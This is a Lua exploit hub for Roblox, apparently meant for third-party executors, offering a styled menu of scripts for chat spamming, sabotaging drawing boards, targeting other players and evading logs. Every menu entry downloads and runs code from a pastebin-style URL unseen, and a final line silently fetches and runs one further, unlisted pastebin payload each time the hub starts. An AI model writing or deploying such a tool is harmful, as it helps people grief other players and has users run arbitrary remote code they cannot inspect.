--[[ DARK HUB I NEW - Script Hub ]]
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local SoundService = game:GetService("SoundService")
local LP = Players.LocalPlayer
local PG = LP:WaitForChild("PlayerGui")

local PREMIUM_ID = 1608444260
local IMAGE = "108806687264265"
local COLORS = {
    Main = Color3.fromRGB(8,8,12), Secondary = Color3.fromRGB(12,12,18),
    Accent = Color3.fromRGB(0,150,255), Text = Color3.fromRGB(255,255,255),
    Text2 = Color3.fromRGB(180,180,210), Card = Color3.fromRGB(14,14,20),
    CardH = Color3.fromRGB(20,20,28), Btn = Color3.fromRGB(0,70,120),
    Success = Color3.fromRGB(0,200,100), Warn = Color3.fromRGB(255,170,0),
    Search = Color3.fromRGB(10,10,16), Hover = Color3.fromRGB(0,120,200),
    Prem = Color3.fromRGB(0,150,255), Error = Color3.fromRGB(255,60,90),
    Border = Color3.fromRGB(0,80,120), Neon = Color3.fromRGB(0,200,255)
}

local SCRIPTS = {
    {"نسخ تلقائي", "SPAM COPY", "https://pastebin.com/raw/AzsukHwR"},
    {"حمايه من النسخ", "DARK ANTI SPAM", "https://pastebin.com/raw/wVfE8u8u"},
    {"سبام سريع ادمن", "SPAN ADMIN SPEED", "https://pastebin.com/raw/8Q7VxjH9"},
    {"مانع تعليق الماب", "ANTI LOG", "https://pastebin.com/raw/p2EvVKmY"},
    {"سكاي بوكس", "DARK SKYBOX", "https://pastebin.com/raw/tPvCAM1z"},
    {"سبام شات الماب", "SPAM CHAT MAP", "https://pastebin.com/raw/DUeZ6pPp"},
    {"تخريب لوحات الرسم", "SABOTAGE", "https://pastebin.com/raw/0Gc9JECz"},
    {"بانق2", "BANG TARGET", "https://pastebin.com/raw/W535TdSy"},
    {"حمايه من الاستهداف", "ANTI TARGET", "https://pastebin.com/raw/JGjPCyTM"},
    {"حمايه من السكن", "ANTI CHAR", "https://pastebin.com/raw/8uN6qSVY"},
    {"بانق لوحه", "BANG", "https://pastebin.com/raw/qv314kwA"},
    {"حمايه من النسخ", "ANTI SPAM COPY", "https://pastebin.com/raw/gV7au21m"},
    {"حمايه من الري و الانفجار", "ANTI EXPLODE & RE", "https://pastefy.app/FlGj8QVo/raw"},
    {"حمايه من الانفجار", "ANTI EXPLODE", "https://pastebin.com/raw/5bxkQKDM"},
    {"تخفيف لاق", "FPS BOOTS", "https://pastebin.com/raw/xRLxFt3c"}
}

local function save(k,v) pcall(function() if writefile then writefile("DARKHUB_"..LP.UserId.."_"..k..".txt",HttpService:JSONEncode(v)) end end) end
local function load(k,d) local s,r = pcall(function() if isfile and readfile then local f = "DARKHUB_"..LP.UserId.."_"..k..".txt" if isfile(f) then local c = readfile(f) if c~="" then return HttpService:JSONDecode(c) end end end return nil end) if s and r~=nil then return r end return d end

local function glow(p,c)
    local g=Instance.new("Frame") g.Size=UDim2.new(1,8,1,8) g.Position=UDim2.new(0,-4,0,-4) g.BackgroundColor3=c g.BackgroundTransparency=.8 g.BorderSizePixel=0 g.ZIndex=0 g.Parent=p
    Instance.new("UICorner",g).CornerRadius=UDim.new(0,14) return g
end
local function sound(id) pcall(function() local s=Instance.new("Sound") s.SoundId="rbxassetid://"..id s.Volume=.35 s.Parent=SoundService s:Play() s.Ended:Once(s.Destroy,s) end) end

local function DRL(url, retry)
    retry = retry or 3
    for i=1,retry do
        local ok,res = pcall(function()
            local r = game:HttpGet(url)
            if r and #r>0 then loadstring(r)() return true end
            error("empty")
        end)
        if ok then return true end
        if i<retry then task.wait(1) end
    end
    return false
end

for _,c in ipairs(PG:GetChildren()) do if c.Name and c.Name:find("DARK") then c:Destroy() end end

local SG = Instance.new("ScreenGui",PG) SG.Name="DARK HUB I NEW" SG.ResetOnSpawn=false SG.DisplayOrder=9999
local auto = load("Auto",{})
local wPos = load("Pos",UDim2.new(.5,-190,.5,-250))
local bPos = load("BPos",UDim2.new(1,-80,.5,-30))
local wSize = UDim2.new(0,400,0,520)
local hSize = UDim2.new(0,400,0,60)
local open,mini,prem = true,false,false
local mf,ms = nil,nil

local function premium()
    local ok,owns = pcall(function() return MarketplaceService:UserOwnsGamePassAsync(LP.UserId,PREMIUM_ID) end)
    if ok and owns then prem=true task.wait(.5)
        local g=Instance.new("ScreenGui",PG) g.Name="TY" g.DisplayOrder=9998
        local ov=Instance.new("Frame",g) ov.Size=UDim2.new(1,0,1,0) ov.BackgroundColor3=Color3.new(0,0,0) ov.BackgroundTransparency=.6
        local cd=Instance.new("Frame",g) cd.Size=UDim2.new(0,0,0,0) cd.Position=UDim2.new(.5,0,.5,0) cd.BackgroundColor3=COLORS.Main cd.BorderSizePixel=0 cd.AnchorPoint=Vector2.new(.5,.5)
        Instance.new("UICorner",cd).CornerRadius=UDim.new(0,20)
        local gl=glow(cd,COLORS.Prem) TweenService:Create(gl,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,-1,true),{BackgroundTransparency=.6}):Play()
        local ic=Instance.new("ImageLabel",cd) ic.Size=UDim2.new(0,80,0,80) ic.Position=UDim2.new(.5,-40,.22,-40) ic.Image="6031302948" ic.ImageColor3=COLORS.Prem ic.BackgroundTransparency=1 ic.AnchorPoint=Vector2.new(.5,.5)
        local tl=Instance.new("TextLabel",cd) tl.Size=UDim2.new(1,-40,0,50) tl.Position=UDim2.new(0,20,.38,0) tl.Text="★ PREMIUM ACTIVATED ★" tl.Font=Enum.Font.GothamBlack tl.TextSize=26 tl.TextColor3=COLORS.Prem tl.BackgroundTransparency=1 tl.TextXAlignment="Center"
        local dl=Instance.new("TextLabel",cd) dl.Size=UDim2.new(1,-40,0,90) dl.Position=UDim2.new(0,20,.58,-45) dl.Text="Thank you!\nPremium member" dl.Font=Enum.Font.GothamMedium dl.TextSize=14 dl.TextColor3=COLORS.Text2 dl.BackgroundTransparency=1 dl.TextXAlignment="Center" dl.TextWrapped=true
        local bt=Instance.new("TextButton",cd) bt.Size=UDim2.new(0,150,0,42) bt.Position=UDim2.new(.5,-75,.86,-21) bt.Text="★ CONTINUE ★" bt.Font=Enum.Font.GothamBold bt.TextSize=15 bt.TextColor3=Color3.new(1,1,1) bt.BackgroundColor3=COLORS.Prem bt.BorderSizePixel=0 bt.AnchorPoint=Vector2.new(.5,.5)
        Instance.new("UICorner",bt).CornerRadius=UDim.new(0,10)
        local function cls()
            TweenService:Create(cd,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.In),{Size=UDim2.new(0,0,0,0),BackgroundTransparency=1}):Play()
            TweenService:Create(ov,TweenInfo.new(.3),{BackgroundTransparency=1}):Play() task.wait(.3) g:Destroy()
        end
        bt.MouseButton1Click:Connect(function() sound(12221967) cls() end)
        task.delay(5,cls)
        TweenService:Create(cd,TweenInfo.new(.6,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{Size=UDim2.new(0,420,0,340)}):Play()
    end
end

local function closeWin()
    if not open then return end open=false wPos=mf.Position save("Pos",wPos)
    TweenService:Create(mf,TweenInfo.new(.25,Enum.EasingStyle.Quad,Enum.EasingDirection.In),{Size=UDim2.new(0,0,0,0),Position=UDim2.new(.5,0,.5,0),BackgroundTransparency=.5}):Play()
    if ms then TweenService:Create(ms,TweenInfo.new(.2),{Transparency=1}):Play() end task.wait(.25) mf.Visible=false mf.BackgroundTransparency=0 if ms then ms.Transparency=0 end
end
local function openWin()
    if open then return end open=true mf.Visible=true mf.Size=UDim2.new(0,0,0,0) mf.Position=wPos mf.BackgroundTransparency=0 if ms then ms.Transparency=0 end
    TweenService:Create(mf,TweenInfo.new(.4,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{Size=wSize,Position=wPos}):Play()
    mini=false local h=mf:FindFirstChild("Header",true) if h then local mb=h:FindFirstChild("Min") if mb then mb.Text="−" end end
    local c=mf:FindFirstChild("Content") if c then c.Visible=true end
end

local function card(data,parent,id)
    local c=Instance.new("Frame",parent) c.Size=UDim2.new(1,-20,0,prem and 95 or 85) c.Position=UDim2.new(0,10,0,0) c.BackgroundColor3=COLORS.Card c.ClipsDescendants=true
    Instance.new("UICorner",c).CornerRadius=UDim.new(0,12)
    local cs=Instance.new("UIStroke",c) cs.Color=COLORS.Border cs.Thickness=1.5
    local gl=glow(c,COLORS.Neon)
    local idf=Instance.new("Frame",c) idf.Size=UDim2.new(0,32,0,32) idf.Position=UDim2.new(0,10,0,10) idf.BackgroundColor3=COLORS.Accent idf.BackgroundTransparency=.2 idf.BorderSizePixel=0
    Instance.new("UICorner",idf).CornerRadius=UDim.new(1,0)
    local idl=Instance.new("TextLabel",idf) idl.Size=UDim2.new(1,0,1,0) idl.Text=tostring(id) idl.TextColor3=COLORS.Accent idl.Font=Enum.Font.GothamBlack idl.TextSize=14 idl.TextXAlignment="Center" idl.BackgroundTransparency=1
    local nl=Instance.new("TextLabel",c) nl.Size=UDim2.new(.55,-55,0,28) nl.Position=UDim2.new(0,52,0,10) nl.Text=data[1] nl.TextColor3=COLORS.Text nl.Font=Enum.Font.GothamBold nl.TextSize=14 nl.TextXAlignment="Left" nl.BackgroundTransparency=1
    if prem then
        local pb=Instance.new("Frame",c) pb.Size=UDim2.new(0,85,0,18) pb.Position=UDim2.new(0,52,0,40) pb.BackgroundColor3=COLORS.Prem pb.BackgroundTransparency=.15 pb.BorderSizePixel=0
        Instance.new("UICorner",pb).CornerRadius=UDim.new(0,4)
        local ps=Instance.new("UIStroke",pb) ps.Color=COLORS.Prem ps.Thickness=1
        local pl=Instance.new("TextLabel",pb) pl.Size=UDim2.new(1,0,1,0) pl.Text="★ PREMIUM ★" pl.TextColor3=COLORS.Prem pl.Font=Enum.Font.GothamBold pl.TextSize=9 pl.BackgroundTransparency=1
    end
    local dl=Instance.new("TextLabel",c) dl.Size=UDim2.new(.55,-55,0,32) dl.Position=UDim2.new(0,52,0,prem and 60 or 38) dl.Text=data[2] dl.TextColor3=COLORS.Text2 dl.Font=Enum.Font.Gotham dl.TextSize=10 dl.TextWrapped=true dl.TextXAlignment="Left" dl.BackgroundTransparency=1
    local eb=Instance.new("TextButton",c) eb.Size=UDim2.new(0,85,0,34) eb.Position=UDim2.new(1,-97,0,10) eb.BackgroundColor3=COLORS.Btn eb.TextColor3=COLORS.Text eb.Font=Enum.Font.GothamBold eb.TextSize=12 eb.Text="EXECUTE"
    Instance.new("UICorner",eb).CornerRadius=UDim.new(0,8)
    local eg=Instance.new("Frame",eb) eg.Size=UDim2.new(1,6,1,6) eg.Position=UDim2.new(0,-3,0,-3) eg.BackgroundColor3=COLORS.Btn eg.BackgroundTransparency=.7 eg.BorderSizePixel=0 eg.ZIndex=0
    Instance.new("UICorner",eg).CornerRadius=UDim.new(0,11)
    local ab=Instance.new("TextButton",c) ab.Size=UDim2.new(0,85,0,34) ab.Position=UDim2.new(1,-97,0,48) ab.BackgroundColor3=Color3.new(.08,.08,.12) ab.Text="AUTO" ab.TextColor3=COLORS.Text2 ab.Font=Enum.Font.GothamBold ab.TextSize=12
    Instance.new("UICorner",ab).CornerRadius=UDim.new(0,8)
    local as=Instance.new("UIStroke",ab) as.Color=Color3.new(.24,.24,.31) as.Thickness=1
    if auto[data[1]] then ab.BackgroundColor3=Color3.new(0,.24,.14) ab.TextColor3=COLORS.Success as.Color=COLORS.Success end
    c.MouseEnter:Connect(function() TweenService:Create(gl,TweenInfo.new(.3),{BackgroundTransparency=.5}):Play() TweenService:Create(cs,TweenInfo.new(.15),{Color=COLORS.Neon,Thickness=2}):Play() TweenService:Create(c,TweenInfo.new(.15),{BackgroundColor3=COLORS.CardH}):Play() end)
    c.MouseLeave:Connect(function() TweenService:Create(gl,TweenInfo.new(.3),{BackgroundTransparency=.8}):Play() TweenService:Create(cs,TweenInfo.new(.15),{Color=COLORS.Border,Thickness=1.5}):Play() TweenService:Create(c,TweenInfo.new(.15),{BackgroundColor3=COLORS.Card}):Play() end)
    eb.MouseEnter:Connect(function() eb.BackgroundColor3=COLORS.Hover TweenService:Create(eg,TweenInfo.new(.15),{BackgroundTransparency=.4,BackgroundColor3=COLORS.Hover}):Play() end)
    eb.MouseLeave:Connect(function() eb.BackgroundColor3=COLORS.Btn TweenService:Create(eg,TweenInfo.new(.15),{BackgroundTransparency=.7,BackgroundColor3=COLORS.Btn}):Play() end)
    eb.MouseButton1Click:Connect(function()
        sound(12221967) local ot=eb.Text eb.Text="DRL..." eb.BackgroundColor3=COLORS.Warn
        if DRL(data[3]) then eb.Text="DONE" eb.BackgroundColor3=COLORS.Success else eb.Text="RETRY" eb.BackgroundColor3=COLORS.Error end
        task.delay(2,function() if eb.Text=="DONE" then eb.Text=ot eb.BackgroundColor3=COLORS.Btn end end)
    end)
    ab.MouseEnter:Connect(function() if not auto[data[1]] then ab.BackgroundColor3=Color3.new(.14,.14,.18) end end)
    ab.MouseLeave:Connect(function() if auto[data[1]] then ab.BackgroundColor3=Color3.new(0,.24,.14) else ab.BackgroundColor3=Color3.new(.08,.08,.12) end end)
    ab.MouseButton1Click:Connect(function()
        sound(12221967) auto[data[1]]=not auto[data[1]]
        if auto[data[1]] then ab.BackgroundColor3=Color3.new(0,.24,.14) ab.TextColor3=COLORS.Success as.Color=COLORS.Success else ab.BackgroundColor3=Color3.new(.08,.08,.12) ab.TextColor3=COLORS.Text2 as.Color=Color3.new(.24,.24,.31) end
        save("Auto",auto)
    end)
    return c
end

local function floatBtn()
    local b=Instance.new("ImageButton",SG) b.Name="DHBtn" b.Size=UDim2.new(0,60,0,60) b.Position=bPos b.BackgroundColor3=Color3.new(0,0,0) b.Image="rbxassetid://"..IMAGE b.ImageColor3=COLORS.Accent b.AutoButtonColor=false
    Instance.new("UICorner",b).CornerRadius=UDim.new(0,14)
    local st=Instance.new("UIStroke",b) st.Color=COLORS.Accent st.Thickness=2
    local gl=glow(b,COLORS.Neon)
    local lb=Instance.new("TextLabel",b) lb.Size=UDim2.new(0,60,0,20) lb.Position=UDim2.new(0,0,1,5) lb.Text="DARK HUB" lb.TextColor3=COLORS.Accent lb.Font=Enum.Font.GothamBold lb.TextSize=11 lb.BackgroundTransparency=1
    local d,sp,bp=false,nil,nil
    b.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then d=true sp=i.Position bp=b.Position i.Changed:Connect(function() if i.UserInputState==Enum.UserInputState.End then d=false save("BPos",b.Position) end end) end end)
    UserInputService.InputChanged:Connect(function(i) if d and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then local dt=i.Position-sp b.Position=UDim2.new(bp.X.Scale,bp.X.Offset+dt.X,bp.Y.Scale,bp.Y.Offset+dt.Y) end end)
    b.MouseEnter:Connect(function() TweenService:Create(b,TweenInfo.new(.15),{Size=UDim2.new(0,65,0,65)}):Play() TweenService:Create(st,TweenInfo.new(.15),{Thickness=3,Color=COLORS.Hover}):Play() TweenService:Create(gl,TweenInfo.new(.15),{BackgroundTransparency=.6}):Play() lb.TextColor3=COLORS.Hover end)
    b.MouseLeave:Connect(function() TweenService:Create(b,TweenInfo.new(.15),{Size=UDim2.new(0,60,0,60)}):Play() TweenService:Create(st,TweenInfo.new(.15),{Thickness=2,Color=COLORS.Accent}):Play() TweenService:Create(gl,TweenInfo.new(.15),{BackgroundTransparency=.8}):Play() lb.TextColor3=COLORS.Accent end)
    b.MouseButton1Click:Connect(function() if d then return end sound(12221967) TweenService:Create(b,TweenInfo.new(.1),{Size=UDim2.new(0,55,0,55)}):Play() task.wait(.1) TweenService:Create(b,TweenInfo.new(.15,Enum.EasingStyle.Elastic),{Size=UDim2.new(0,60,0,60)}):Play() if open then closeWin() else openWin() end end)
    return b
end

local function mainWin()
    mf=Instance.new("Frame",SG) mf.Name="Main" mf.Size=wSize mf.Position=wPos mf.BackgroundColor3=COLORS.Main mf.Visible=true mf.ClipsDescendants=true
    Instance.new("UICorner",mf).CornerRadius=UDim.new(0,16)
    ms=Instance.new("UIStroke",mf) ms.Color=COLORS.Accent ms.Thickness=2
    local hd=Instance.new("Frame",mf) hd.Name="Header" hd.Size=UDim2.new(1,0,0,65) hd.BackgroundColor3=COLORS.Secondary
    Instance.new("UICorner",hd).CornerRadius=UDim.new(0,16,0,0)
    local lg=Instance.new("ImageLabel",hd) lg.Size=UDim2.new(0,42,0,42) lg.Position=UDim2.new(0,14,.5,-21) lg.Image="rbxassetid://"..IMAGE lg.ImageColor3=COLORS.Accent lg.BackgroundTransparency=1
    local ls=Instance.new("UIStroke",lg) ls.Color=COLORS.Accent ls.Thickness=1.5
    local lgl=glow(lg,COLORS.Neon)
    lg.MouseEnter:Connect(function() TweenService:Create(lg,TweenInfo.new(.15),{Size=UDim2.new(0,48,0,48),Position=UDim2.new(0,11,.5,-24)}):Play() TweenService:Create(ls,TweenInfo.new(.15),{Thickness=2.5,Color=COLORS.Hover}):Play() TweenService:Create(lgl,TweenInfo.new(.15),{BackgroundTransparency=.6}):Play() lg.ImageColor3=COLORS.Hover end)
    lg.MouseLeave:Connect(function() TweenService:Create(lg,TweenInfo.new(.15),{Size=UDim2.new(0,42,0,42),Position=UDim2.new(0,14,.5,-21)}):Play() TweenService:Create(ls,TweenInfo.new(.15),{Thickness=1.5,Color=COLORS.Accent}):Play() TweenService:Create(lgl,TweenInfo.new(.15),{BackgroundTransparency=.8}):Play() lg.ImageColor3=COLORS.Accent end)
    local tl=Instance.new("TextLabel",hd) tl.Position=UDim2.new(0,66,0,12) tl.Text="DARK HUB  " tl.TextColor3=prem and COLORS.Prem or COLORS.Text tl.Font=Enum.Font.GothamBlack tl.TextSize=20 tl.TextXAlignment="Left" tl.BackgroundTransparency=1 tl.Size=UDim2.new(0,tl.TextBounds.X+10,0,28)
    if prem then local pb=Instance.new("TextLabel",hd) pb.Size=UDim2.new(0,80,0,20) pb.Position=UDim2.new(0,tl.TextBounds.X+72,0,14) pb.Text="★ PREMIUM ★" pb.TextColor3=Color3.new(0,0,0) pb.Font=Enum.Font.GothamBlack pb.TextSize=10 pb.BackgroundColor3=COLORS.Prem Instance.new("UICorner",pb).CornerRadius=UDim.new(0,5) end
    local sl=Instance.new("TextLabel",hd) sl.Position=UDim2.new(0,66,0,40) sl.Text="SCRIPT HUB" sl.TextColor3=COLORS.Accent sl.Font=Enum.Font.GothamBold sl.TextSize=10 sl.TextXAlignment="Left" sl.BackgroundTransparency=1 sl.Size=UDim2.new(0,sl.TextBounds.X+10,0,16)
    local mb=Instance.new("TextButton",hd) mb.Name="Min" mb.Size=UDim2.new(0,36,0,36) mb.Position=UDim2.new(1,-82,.5,-18) mb.Text="−" mb.TextColor3=COLORS.Text2 mb.Font=Enum.Font.GothamBlack mb.TextSize=26 mb.BackgroundColor3=Color3.new(.08,.08,.12) mb.BorderSizePixel=0
    Instance.new("UICorner",mb).CornerRadius=UDim.new(0,8)
    local cb=Instance.new("TextButton",hd) cb.Size=UDim2.new(0,36,0,36) cb.Position=UDim2.new(1,-42,.5,-18) cb.Text="X" cb.TextColor3=COLORS.Text2 cb.Font=Enum.Font.GothamBlack cb.TextSize=18 cb.BackgroundColor3=Color3.new(.08,.08,.12) cb.BorderSizePixel=0
    Instance.new("UICorner",cb).CornerRadius=UDim.new(0,8)
    local ct=Instance.new("Frame",mf) ct.Name="Content" ct.Size=UDim2.new(1,0,1,-65) ct.Position=UDim2.new(0,0,0,65) ct.BackgroundTransparency=1
    local sf=Instance.new("Frame",ct) sf.Size=UDim2.new(1,-24,0,44) sf.Position=UDim2.new(0,12,0,12) sf.BackgroundColor3=COLORS.Search
    Instance.new("UICorner",sf).CornerRadius=UDim.new(0,10) local sst=Instance.new("UIStroke",sf) sst.Color=COLORS.Border sst.Thickness=1.5
    local ic=Instance.new("ImageLabel",sf) ic.Size=UDim2.new(0,20,0,20) ic.Position=UDim2.new(0,12,.5,-10) ic.Image="6031094667" ic.ImageColor3=COLORS.Text2 ic.BackgroundTransparency=1
    local tb=Instance.new("TextBox",sf) tb.Size=UDim2.new(1,-50,1,0) tb.Position=UDim2.new(0,42,0,0) tb.PlaceholderText="Search..." tb.PlaceholderColor3=Color3.new(.39,.39,.51) tb.Text="" tb.TextColor3=COLORS.Text tb.Font=Enum.Font.GothamMedium tb.TextSize=13 tb.TextXAlignment="Left" tb.BackgroundTransparency=1 tb.ClearTextOnFocus=false
    local sc=Instance.new("ScrollingFrame",ct) sc.Size=UDim2.new(1,0,1,-72) sc.Position=UDim2.new(0,0,0,66) sc.BackgroundTransparency=1 sc.CanvasSize=UDim2.new(0,0,0,0) sc.ScrollBarThickness=4 sc.ScrollBarImageColor3=COLORS.Accent sc.ScrollBarImageTransparency=.5 sc.AutomaticCanvasSize="Y"
    local ly=Instance.new("UIListLayout",sc) ly.Padding=UDim.new(0,10)
    local cards={} for i,d in ipairs(SCRIPTS) do local cd=card(d,sc,i) table.insert(cards,{c=cd,n=d[1],dc=d[2]}) end
    tb:GetPropertyChangedSignal("Text"):Connect(function() local tx=tb.Text:lower() for _,v in ipairs(cards) do if #tx==0 or v.n:lower():find(tx) or v.dc:lower():find(tx) then v.c.Visible=true else v.c.Visible=false end end end)
    local dw,dsp,dwp=false,nil,nil
    mf.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then dw=true dsp=i.Position dwp=mf.Position i.Changed:Connect(function() if i.UserInputState==Enum.UserInputState.End then dw=false wPos=mf.Position save("Pos",wPos) end end) end end)
    UserInputService.InputChanged:Connect(function(i) if dw and i.UserInputType==Enum.UserInputType.MouseMovement then local dt=i.Position-dsp mf.Position=UDim2.new(dwp.X.Scale,dwp.X.Offset+dt.X,dwp.Y.Scale,dwp.Y.Offset+dt.Y) end end)
    mb.MouseButton1Click:Connect(function() sound(12221967) if mini then mini=false mb.Text="−" ct.Visible=true TweenService:Create(mf,TweenInfo.new(.25,Enum.EasingStyle.Quad),{Size=wSize}):Play() else mini=true mb.Text="+" ct.Visible=false TweenService:Create(mf,TweenInfo.new(.25,Enum.EasingStyle.Quad),{Size=hSize}):Play() end end)
    cb.MouseButton1Click:Connect(function() sound(12221967) closeWin() end)
    mb.MouseEnter:Connect(function() mb.BackgroundColor3=Color3.new(.16,.16,.2) mb.TextColor3=COLORS.Text end) mb.MouseLeave:Connect(function() mb.BackgroundColor3=Color3.new(.08,.08,.12) mb.TextColor3=COLORS.Text2 end)
    cb.MouseEnter:Connect(function() cb.BackgroundColor3=Color3.new(.27,.12,.12) cb.TextColor3=Color3.new(1,.39,.39) end) cb.MouseLeave:Connect(function() cb.BackgroundColor3=Color3.new(.08,.08,.12) cb.TextColor3=COLORS.Text2 end)
end

task.spawn(function() pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/31YfRzNf"))() end) end)
task.spawn(function()
    premium() task.wait(.3) floatBtn() mainWin()
    task.wait(1.5) for i,d in ipairs(SCRIPTS) do if auto[d[1]] then task.spawn(function() task.wait(i*.15) DRL(d[3]) end) end end
end)
